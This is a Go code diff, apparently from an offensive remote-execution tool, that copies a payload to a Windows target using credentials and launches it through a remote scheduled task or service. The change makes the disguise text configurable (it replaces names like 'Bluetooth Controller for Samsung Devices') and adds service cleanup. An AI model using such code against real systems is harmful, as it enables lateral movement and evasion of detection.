@@ -29,7 +29,7 @@ const (
 	ENABLE_PROCESSED_OUTPUT            uint32 = 0x0001
 )
 
-func handleTCP(target, user, pass, domain, name, dropmethod, ip, shell string, runas, reverse bool, port int, nodelete bool) {
+func handleTCP(target, user, pass, domain, name, dropmethod, ip, shell string, runas, reverse bool, port int, nodelete bool, description string) {
 	// TODO - Abstract this to a helper func to reduce code duplication
 	// First, no matter what, we must copy gopipe to the target
 	fileName := getRandomString(12)
@@ -80,7 +80,7 @@ func handleTCP(target, user, pass, domain, name, dropmethod, ip, shell string, r
 			return
 		}
 	} else if dropmethod == "task" {
-		err = createRemoteScheduledTask(target, name, user, pass, domain, "Bluetooth Controller for Samsung Devices", runas)
+		err = createRemoteScheduledTask(target, name, user, pass, domain, description, runas)
 		if err != nil {
 			log.Printf("Failed to create task: %v\n", err)
 			return
@@ -100,7 +100,7 @@ func handleTCP(target, user, pass, domain, name, dropmethod, ip, shell string, r
 		}
 		// TODO - Check actual task status here
 	} else if dropmethod == "service" {
-		err := CreateRemoteService(target, name, name, "Bluetooth controller for XAIE", "cmd.exe /c cmd.exe", user, pass, domain, runas)
+		err := CreateRemoteService(target, name, name, description, "cmd.exe /c cmd.exe", user, pass, domain, runas)
 		if err != nil {
 			log.Printf("Failed to create service: %v\n", err)
 			return
@@ -129,6 +129,15 @@ func handleTCP(target, user, pass, domain, name, dropmethod, ip, shell string, r
 	err = os.Remove(targetFile)
 	if err != nil {
 		log.Println(err.Error())
+	}
+
+	if dropmethod == "service" {
+		if !nodelete {
+			err = deleteRemoteService(target, user, pass, domain, name)
+			if err != nil {
+				log.Printf("Failed to delete service: %v\n", err)
+			}
+		}
 	}
 
 }
